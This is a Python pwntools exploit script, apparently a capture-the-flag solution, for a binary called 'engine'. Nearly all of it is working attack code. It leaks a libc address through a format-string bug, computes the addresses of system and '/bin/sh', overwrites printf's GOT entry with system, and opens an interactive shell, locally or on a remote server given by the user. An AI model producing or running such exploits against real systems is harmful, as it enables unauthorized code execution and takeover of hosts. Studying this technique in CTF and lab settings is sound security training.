from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Function to be called by FmtStr
def send_payload(payload):
    io.sendlineafter(':', payload)
    io.recvuntil('(')
    test = io.recvuntil(') now')[:-5]
    return test


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Binary filename
exe = './engine'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = process(exe)

# Calculate format string offset, so we can use later in write operations
format_string = FmtStr(execute_fmt=send_payload)
info("format string offset: %d", format_string.offset)

# Start program
io = start()

# 33 is __libc_start_main+234
leaked_addr = int(send_payload('%{}$p'.format(33)), 16)
info('leaked_addr: %#x', leaked_addr)
# Calculate offsets
system = leaked_addr + 0x22146
libc_base = system - 0x48e50
bin_sh = libc_base + 0x18c338
printf = libc_base + 0x56cf0
info('libc_base: %#x', libc_base)
info('system: %#x', system)
info('bin_sh: %#x', bin_sh)
info('printf: %#x', printf)

# Overwrite got.printf address with address of system()
format_string.write(elf.got.printf, system)
# Execute the write operations
format_string.execute_writes()

io.interactive()
